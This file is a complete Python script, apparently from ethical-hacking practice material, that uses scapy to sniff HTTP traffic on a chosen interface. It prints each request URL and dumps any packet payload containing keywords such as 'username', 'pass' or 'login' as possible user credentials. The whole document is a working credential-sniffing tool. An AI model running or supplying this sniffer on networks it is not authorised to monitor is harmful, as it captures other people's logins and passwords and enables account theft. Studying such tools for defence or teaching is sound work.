#!/usr/bin/env python

import argparse
import scapy.all as scapy
import scapy.layers.http as http


def get_url(packet):
    return str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)


def get_user_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "email", "pass", "password", "pwd", "usr", "user", "login"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request URL: " + url)

        user_credentials = get_user_credentials(packet)
        if user_credentials:
            print("\n\n[+] Possible user credentials are -> " + str(user_credentials) + "\n\n")


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def main():
    parser = argparse.ArgumentParser(description="HTTP Request Sniffer")
    parser.add_argument("interface", help="The network interface to sniff on")
    args = parser.parse_args()

    print("[+] Starting HTTP Request Sniffer on interface: " + args.interface)
    sniffer(args.interface)


if __name__ == "__main__":
    main()
